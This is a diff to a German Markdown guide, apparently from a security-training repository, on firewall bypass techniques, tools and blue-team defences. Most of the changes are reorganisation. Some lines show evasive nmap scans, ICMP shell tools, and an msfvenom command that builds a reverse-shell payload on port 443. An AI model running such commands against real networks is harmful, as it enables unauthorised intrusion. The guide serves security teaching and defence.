@@ -1,6 +1,20 @@
 # 🔥 Firewall Bypass – Techniken, Tools & Schutzmaßnahmen
 
-## 🧭 Einleitung
+---
+
+## Inhaltsverzeichnis
+- [Einleitung](#einleitung)
+- [Arten von Firewalls](#arten-von-firewalls)
+- [Ziel von Firewall Bypass Techniken](#ziel-von-firewall-bypass-techniken)
+- [Häufige Techniken zur Umgehung](#häufige-techniken-zur-umgehung)
+- [Tools zur Analyse und Bypass](#tools-zur-analyse-und-bypass)
+- [Verteidigungsmaßnahmen (Blue Team)](#verteidigungsmaßnahmen-blue-team)
+- [Lernressourcen)](#lernressourcen)
+- [Haftungsausschluss](#haftungsausschluss)
+
+---
+
+## Einleitung
 
 Firewalls sind Sicherheitsmechanismen, die den Netzwerkverkehr auf Basis definierter Regeln filtern. Sie dienen dazu:
 - **Unerlaubte Zugriffe zu verhindern**
@@ -11,7 +25,7 @@ Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z.
 
 ---
 
-## 🛡️ Arten von Firewalls
+## Arten von Firewalls
 
 | Firewall-Typ            | Beschreibung                                         |
 |--------------------------|------------------------------------------------------|
@@ -24,7 +38,13 @@ Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z.
 
 ---
 
-## 🎯 Ziel von Firewall Bypass Techniken
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Ziel von Firewall Bypass Techniken
 
 - Zugriff auf gesperrte Ports oder Dienste
 - Umgehen von Inhaltsscans (z. B. bei WAFs)
@@ -33,7 +53,7 @@ Ein **Firewall Bypass** bezeichnet die **Umgehung dieser Filtermechanismen**, z.
 
 ---
 
-## 🧪 Häufige Techniken zur Umgehung
+## Häufige Techniken zur Umgehung
 
 ### 1. **Tarnung über erlaubte Ports**
 > Firewalls blockieren oft alles außer HTTP (80), HTTPS (443), DNS (53), usw.
@@ -72,15 +92,7 @@ Durch Aufteilen des Paketinhalts auf mehrere TCP-Segmente kann die Firewall umga
 nmap -f target.com      # Fragmentierter Scan
 ```
 
-### 3. Fragmentierung von Paketen
-
-Durch Aufteilen des Paketinhalts auf mehrere TCP-Segmente kann die Firewall umgangen werden, wenn sie keine vollständige Rekonstruktion vornimmt.
-
-```bash
-nmap --scan-delay 1s target.com
-```
-
-### 5. Protocol Tunneling (DNS, ICMP, HTTP)
+### 4. Protocol Tunneling (DNS, ICMP, HTTP)
 
     Verbotene Protokolle über erlaubte Protokolle transportieren
 
@@ -92,7 +104,7 @@ Tools:
 - icmpsh – Shell über ICMP
 
 
-### 6. Über Ports, die der Firewall "vertrauenswürdig" erscheinen
+### 5. Über Ports, die der Firewall "vertrauenswürdig" erscheinen
 
 Reverse Shell über HTTPS:
 ```bash
@@ -101,7 +113,13 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 
 ---
 
-## 🔧 Tools zur Analyse und Bypass
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+## Tools zur Analyse und Bypass
 
 | Tool       | Zweck                                      |
 | ---------- | ------------------------------------------ |
@@ -114,7 +132,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 
 ---
 
-## 🔐 Verteidigungsmaßnahmen (Blue Team)
+## Verteidigungsmaßnahmen (Blue Team)
 
 - Port-Whitelisting: Nur notwendige Ports erlauben
 - Deep Packet Inspection (DPI): Inhalte auch fragmentiert scannen
@@ -125,7 +143,16 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=443 -f elf > sh
 
 ---
 
-## ⚠️ Haftungsausschluss
+## Lernressourcen
+
+- TryHackMe: Rooms zu „Firewall Evasion“ und „Nmap Advanced“
+- HackTheBox: Viele Labs mit WAF/Firewall-Herausforderungen
+- YouTube: John Hammond, The Cyber Mentor – „Firewall Evasion Techniques“
+- Bücher: „The Hacker Playbook 3“, „Nmap Network Scanning“
+
+---
+
+## Haftungsausschluss
 
 Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.
 
@@ -134,18 +161,17 @@ Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisi
 Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
 Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.
 
+[Disclaimer](/00-disclaimer/disclaimer.md)
+
 --- 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 Stay curious – stay secure. 🔐
 
-🗓️ **Letzte Aktualisierung:** Juli 2025  
+🗓️ **Letzte Aktualisierung:** August 2025  
 🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!
-
----
-
-## 📚 Lernressourcen
-
-- TryHackMe: Rooms zu „Firewall Evasion“ und „Nmap Advanced“
-- HackTheBox: Viele Labs mit WAF/Firewall-Herausforderungen
-- YouTube: John Hammond, The Cyber Mentor – „Firewall Evasion Techniques“
-- Bücher: „The Hacker Playbook 3“, „Nmap Network Scanning“
